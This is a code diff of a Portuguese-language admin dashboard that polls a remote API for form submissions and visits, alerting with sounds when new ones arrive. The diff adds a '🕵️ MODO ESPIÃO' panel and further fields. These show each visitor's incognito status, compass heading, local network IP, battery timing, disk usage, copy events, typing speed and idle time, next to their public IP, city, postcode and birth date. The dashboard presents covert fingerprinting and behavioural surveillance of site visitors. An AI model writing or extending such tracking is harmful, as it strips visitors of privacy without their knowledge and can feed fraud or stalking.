@@ -37,8 +37,6 @@
     h1::after { content: '_'; animation: blink 1s infinite; }
     @keyframes blink { 0%,50%{opacity:1;} 51%,100%{opacity:0;} }
     .status { font-size: 13px; color: #00ff41; letter-spacing: 1px; }
-
-    /* Botão de som */
     #btnSom {
       padding: 8px 14px; border: 1px solid #ffc800;
       background: transparent; color: #ffc800;
@@ -56,7 +54,6 @@
       0%,100% { box-shadow: 0 0 15px #ffc800; }
       50%     { box-shadow: 0 0 25px #ffc800, 0 0 35px #ffc800; }
     }
-
     .dot {
       display: inline-block; width: 9px; height: 9px;
       border-radius: 50%; background: #00ff41; margin-right: 6px;
@@ -64,7 +61,6 @@
       animation: pulse 1.5s infinite;
     }
     @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
-
     .cards-top { display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 20px; }
     .card-top {
       background: #050505; border: 1px solid #00ff41;
@@ -81,22 +77,15 @@
       animation: scan 3s linear infinite;
     }
     @keyframes scan { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
-
-    /* Efeito de "piscar" quando chega notificação */
-    .card-top.flash {
-      animation: flashCard 1s ease;
-    }
+    .card-top.flash { animation: flashCard 1s ease; }
     @keyframes flashCard {
       0%   { background: #050505; box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: scale(1); }
       30%  { background: #00ff41; box-shadow: 0 0 40px #00ff41, 0 0 60px #00ff41; transform: scale(1.05); }
       100% { background: #050505; box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: scale(1); }
     }
-    .card-top.flash .num,
-    .card-top.flash .lbl { color: #000; }
-
+    .card-top.flash .num, .card-top.flash .lbl { color: #000; }
     .card-top .num { font-size: 32px; font-weight: bold; color: #00ff41; text-shadow: 0 0 10px #00ff41; }
     .card-top .lbl { font-size: 11px; color: #00aa2b; text-transform: uppercase; margin-top: 6px; letter-spacing: 1.5px; }
-
     .controles { display: flex; gap: 10px; margin-bottom: 14px; flex-wrap: wrap; }
     button {
       padding: 9px 16px; border: 1px solid #00ff41;
@@ -124,17 +113,7 @@
       background: #050505; border: 1px solid #00ff41;
       border-radius: 6px; overflow: hidden;
       box-shadow: 0 0 15px rgba(0,255,65,0.15);
-      transition: all 0.3s;
     }
-    .cadastro.novo {
-      animation: flashCadastro 2s ease;
-    }
-    @keyframes flashCadastro {
-      0%   { border-color: #00ff41; box-shadow: 0 0 15px rgba(0,255,65,0.15); }
-      20%  { border-color: #ffc800; box-shadow: 0 0 40px #ffc800, 0 0 60px rgba(255,200,0,0.5); }
-      100% { border-color: #00ff41; box-shadow: 0 0 15px rgba(0,255,65,0.15); }
-    }
-
     .cadastro-header {
       display: flex; justify-content: space-between;
       align-items: center; gap: 10px;
@@ -160,6 +139,7 @@
     .bloco-hw .bloco-titulo { background: rgba(200,0,255,0.12); color: #d966ff; border-bottom: 1px solid #d966ff; }
     .bloco-loc .bloco-titulo { background: rgba(255,0,120,0.12); color: #ff0078; border-bottom: 1px solid #ff0078; }
     .bloco-origem .bloco-titulo { background: rgba(255,140,0,0.12); color: #ff8c00; border-bottom: 1px solid #ff8c00; }
+    .bloco-espiao .bloco-titulo { background: rgba(255,50,50,0.15); color: #ff3232; border-bottom: 1px solid #ff3232; }
     .cadastro-body {
       padding: 16px 18px;
       display: grid;
@@ -184,6 +164,8 @@
     .bloco-loc .campo .valor { color: #ff0078; text-shadow: 0 0 5px rgba(255,0,120,0.7); }
     .bloco-origem .campo .rotulo { color: #aa5500; }
     .bloco-origem .campo .valor { color: #ff8c00; text-shadow: 0 0 5px rgba(255,140,0,0.7); }
+    .bloco-espiao .campo .rotulo { color: #aa2222; }
+    .bloco-espiao .campo .valor { color: #ff3232; text-shadow: 0 0 5px rgba(255,50,50,0.7); }
     .vazio {
       text-align: center; padding: 40px; color: #00aa2b;
       letter-spacing: 2px; border: 1px dashed #00aa2b; border-radius: 6px;
@@ -192,8 +174,6 @@
       padding: 10px 18px; border-top: 1px solid #00ff41;
       display: flex; justify-content: flex-end;
     }
-
-    /* Aviso de notificação (aparece no topo) */
     #avisoTopo {
       display: none;
       position: fixed;
@@ -213,18 +193,8 @@
       from { opacity: 0; transform: translate(-50%, -30px); }
       to   { opacity: 1; transform: translate(-50%, 0); }
     }
-    #avisoTopo.aviso-clique {
-      background: #00ff41;
-      color: #000;
-      border: 2px solid #00ff41;
-    }
-    #avisoTopo.aviso-cadastro {
-      background: #ffc800;
-      color: #000;
-      border: 2px solid #ffc800;
-      font-size: 20px;
-    }
-
+    #avisoTopo.aviso-clique { background: #00ff41; color: #000; border: 2px solid #00ff41; }
+    #avisoTopo.aviso-cadastro { background: #ffc800; color: #000; border: 2px solid #ffc800; font-size: 20px; }
     ::-webkit-scrollbar { width: 10px; height: 10px; }
     ::-webkit-scrollbar-track { background: #000; }
     ::-webkit-scrollbar-thumb { background: #00aa2b; border-radius: 5px; }
@@ -233,7 +203,6 @@
 </head>
 <body>
 
-  <!-- Aviso que aparece no topo -->
   <div id="avisoTopo"></div>
 
   <div class="terminal-bar">
@@ -282,8 +251,6 @@
   <script>
     const API_URL = 'https://gets-invio-on-api.onrender.com';
     let todosDados = [];
-
-    // ============ SISTEMA DE SOM ============
     let audioCtx = null;
     let somAtivo = false;
 
@@ -293,42 +260,32 @@
         somAtivo = true;
         document.getElementById('btnSom').textContent = '[ 🔊 SOM ATIVO ]';
         document.getElementById('btnSom').classList.add('ativo');
-        // Toca um som de confirmação
         tocarTom(880, 0.1);
         setTimeout(() => tocarTom(1100, 0.15), 120);
-      } catch (e) {
-        alert('Seu navegador não suporta áudio!');
-      }
+      } catch (e) { alert('Seu navegador não suporta áudio!'); }
     }
 
     function tocarTom(freq, duracao, tipo = 'sine', volume = 0.3) {
       if (!somAtivo || !audioCtx) return;
       const osc = audioCtx.createOscillator();
       const gain = audioCtx.createGain();
-      osc.connect(gain);
-      gain.connect(audioCtx.destination);
-      osc.type = tipo;
-      osc.frequency.value = freq;
+      osc.connect(gain); gain.connect(audioCtx.destination);
+      osc.type = tipo; osc.frequency.value = freq;
       gain.gain.setValueAtTime(volume, audioCtx.currentTime);
       gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duracao);
-      osc.start();
-      osc.stop(audioCtx.currentTime + duracao);
+      osc.start(); osc.stop(audioCtx.currentTime + duracao);
     }
 
-    // Som 1: Clique no site (dois bipes agudos curtos)
     function somClique() {
       tocarTom(1300, 0.1);
       setTimeout(() => tocarTom(1600, 0.12), 130);
     }
-
-    // Som 2: Novo cadastro (três bipes crescentes, tipo alarme)
     function somCadastro() {
       tocarTom(800, 0.15, 'triangle', 0.4);
       setTimeout(() => tocarTom(1000, 0.15, 'triangle', 0.4), 180);
       setTimeout(() => tocarTom(1300, 0.25, 'triangle', 0.4), 360);
     }
 
-    // ============ AVISO NO TOPO ============
     function mostrarAviso(texto, tipo) {
       const el = document.getElementById('avisoTopo');
       el.textContent = texto;
@@ -338,7 +295,6 @@
       el._timer = setTimeout(() => { el.style.display = 'none'; }, 4000);
     }
 
-    // ============ FLASH NOS CARDS ============
     function flashCard(id) {
       const el = document.getElementById(id);
       if (!el) return;
@@ -346,23 +302,17 @@
       setTimeout(() => el.classList.remove('flash'), 1000);
     }
 
-    // ============ DETECTA NOVOS ============
     let ultimoTotalVisitas = null;
     let ultimoTotalCadastros = null;
 
-    // ============ CARREGAR VISITAS ============
     async function carregarVisitas() {
       try {
         const r = await fetch(API_URL + '/visitas');
         const { total, hoje } = await r.json();
-
-        // Detecta novo clique
         if (ultimoTotalVisitas !== null && total > ultimoTotalVisitas) {
-          somClique();
-          flashCard('cardVisitas');
+          somClique(); flashCard('cardVisitas');
           mostrarAviso('👆 Novo clique no site!', 'clique');
         }
-
         ultimoTotalVisitas = total;
         document.getElementById('total-visitas').textContent = total;
         document.getElementById('visitas-hoje').textContent = hoje;
@@ -372,28 +322,20 @@
       }
     }
 
-    // ============ CARREGAR CADASTROS ============
     async function carregar() {
       try {
         const r = await fetch(API_URL + '/dados');
         const { dados } = await r.json();
         todosDados = dados;
-
-        // Detecta novo cadastro
         if (ultimoTotalCadastros !== null && dados.length > ultimoTotalCadastros) {
-          somCadastro();
-          flashCard('cardTotal');
-          flashCard('cardHoje');
+          somCadastro(); flashCard('cardTotal'); flashCard('cardHoje');
           mostrarAviso('🚨 Novo cadastro recebido!', 'cadastro');
         }
-
         ultimoTotalCadastros = dados.length;
-
         document.getElementById('total').textContent = dados.length;
         const hoje = new Date().toDateString();
         const doDia = dados.filter(d => new Date(d.recebidoEm).toDateString() === hoje);
         document.getElementById('hoje').textContent = doDia.length;
-
         renderizar(dados);
       } catch (e) {
         document.getElementById('lista').innerHTML =
@@ -491,6 +433,12 @@
       const s = seg % 60;
       return `${min} min ${s}s`;
     }
+    function formatarDirecao(graus) {
+      if (graus == null) return 'N/A (bloqueado ou sem permissão)';
+      const direcoes = ['Norte ⬆️','Nordeste ↗️','Leste ➡️','Sudeste ↘️','Sul ⬇️','Sudoeste ↙️','Oeste ⬅️','Noroeste ↖️'];
+      const idx = Math.round(graus / 45) % 8;
+      return `${direcoes[idx]} (${graus}°)`;
+    }
 
     function renderizar(dados) {
       if (dados.length === 0) {
@@ -528,7 +476,10 @@
             <div class="cadastro-body">
               <div class="campo"><div class="rotulo">Bateria</div><div class="valor">${iconeBateria(dev.bateria && dev.bateria.nivel)} ${dev.bateria ? dev.bateria.nivel + '%' : 'N/A'}</div></div>
               <div class="campo"><div class="rotulo">Carregando?</div><div class="valor">${dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Velocidade da conexão</div><div class="valor">${formatarConexao(dev.conexao)}</div></div>
+              <div class="campo"><div class="rotulo">Tempo pra carregar</div><div class="valor">${dev.bateria && dev.bateria.tempoCarregar ? '⏱️ ' + dev.bateria.tempoCarregar + ' min' : 'N/A'}</div></div>
+              <div class="campo"><div class="rotulo">Tempo restante</div><div class="valor">${dev.bateria && dev.bateria.tempoDescarregar ? '⏳ ' + dev.bateria.tempoDescarregar + ' min' : 'N/A'}</div></div>
+              <div class="campo"><div class="rotulo">Velocidade</div><div class="valor">${formatarConexao(dev.conexao)}</div></div>
+              <div class="campo"><div class="rotulo">Tipo de conexão</div><div class="valor">${dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A'}</div></div>
             </div>
           </div>
         `;
@@ -541,6 +492,7 @@
               <div class="campo"><div class="rotulo">Núcleos CPU</div><div class="valor">⚙️ ${dev.nucleos || 'N/A'}</div></div>
               <div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ${esc(dev.gpu)}</div></div>
               <div class="campo"><div class="rotulo">Profundidade de cor</div><div class="valor">🎨 ${dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A'}</div></div>
+              <div class="campo"><div class="rotulo">Espaço em disco</div><div class="valor">${dev.storage ? '💾 ' + dev.storage.quota + ' MB (usando ' + dev.storage.uso + ' MB)' : 'N/A'}</div></div>
             </div>
           </div>
         `;
@@ -549,12 +501,13 @@
           <div class="bloco-loc">
             <div class="bloco-titulo">LOCALIZAÇÃO & IP</div>
             <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">IP</div><div class="valor">🌐 ${esc(d.ip)}</div></div>
+              <div class="campo"><div class="rotulo">IP público</div><div class="valor">🌐 ${esc(d.ip)}</div></div>
+              <div class="campo"><div class="rotulo">IP local (rede)</div><div class="valor">${dev.ipLocal ? '🏠 ' + esc(dev.ipLocal) : 'N/A'}</div></div>
               <div class="campo"><div class="rotulo">País</div><div class="valor">${bandeiraPais(loc.codigoPais)} ${esc(loc.pais)}</div></div>
               <div class="campo"><div class="rotulo">Estado / Região</div><div class="valor">🗺️ ${esc(loc.regiao)}</div></div>
               <div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ${esc(loc.cidade)}</div></div>
               <div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ${esc(loc.cep)}</div></div>
-              <div class="campo"><div class="rotulo">Operadora / Provedor</div><div class="valor">📡 ${esc(loc.operadora)}</div></div>
+              <div class="campo"><div class="rotulo">Operadora</div><div class="valor">📡 ${esc(loc.operadora)}</div></div>
             </div>
           </div>
         ` : '';
@@ -566,6 +519,20 @@
               <div class="campo"><div class="rotulo">Veio de onde</div><div class="valor">${iconeOrigem(d.origem)} ${esc(d.origem)}</div></div>
               <div class="campo"><div class="rotulo">Já visitou antes</div><div class="valor">${d.jaVisitou ? '🔁 Sim (cliente recorrente)' : '🆕 Primeira vez'}</div></div>
               <div class="campo"><div class="rotulo">Tempo de preenchimento</div><div class="valor">⏱️ ${formatarTempo(d.tempoPreenchimento)}</div></div>
+              <div class="campo"><div class="rotulo">Tempo parado</div><div class="valor">⏸️ ${formatarTempo(d.tempoFora)}</div></div>
+              <div class="campo"><div class="rotulo">Copiou algo?</div><div class="valor">${d.copiouAlgo ? '📋 Sim (Ctrl+C)' : '❌ Não'}</div></div>
+              <div class="campo"><div class="rotulo">Velocidade de digitação</div><div class="valor">⌨️ ${d.velocidadeDigitacao ? d.velocidadeDigitacao + ' teclas/min' : 'N/A'}</div></div>
+            </div>
+          </div>
+        `;
+
+        const blocoEspiao = `
+          <div class="bloco-espiao">
+            <div class="bloco-titulo">🕵️ MODO ESPIÃO</div>
+            <div class="cadastro-body">
+              <div class="campo"><div class="rotulo">Modo anônimo?</div><div class="valor">${dev.incognito ? '🕶️ Sim (aba privada)' : '❌ Não (aba normal)'}</div></div>
+              <div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ${formatarDirecao(dev.bussola)}</div></div>
+              <div class="campo"><div class="rotulo">Rede corporativa?</div><div class="valor">${dev.ipLocal && (dev.ipLocal.startsWith('10.') || dev.ipLocal.startsWith('172.') || dev.ipLocal.startsWith('192.168.')) ? '🏢 Possível rede interna' : '🌐 Rede pública'}</div></div>
             </div>
           </div>
         `;
@@ -585,9 +552,10 @@
             <div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">${formatarData(d.dataNascimento)}</div></div>
           </div>
 
-          ${d.dispositivo ? blocoDevice + blocoBateria + blocoHW : ''}
+          ${d.dispositivo ? blocoDevice + blocoBateria + blocoHw : ''}
           ${blocoLoc}
           ${blocoOrigem}
+          ${d.dispositivo ? blocoEspiao : ''}
 
           <div class="botoes-card">
             <button class="btn-del" onclick="apagar(${d.id})">[ DELETE ]</button>
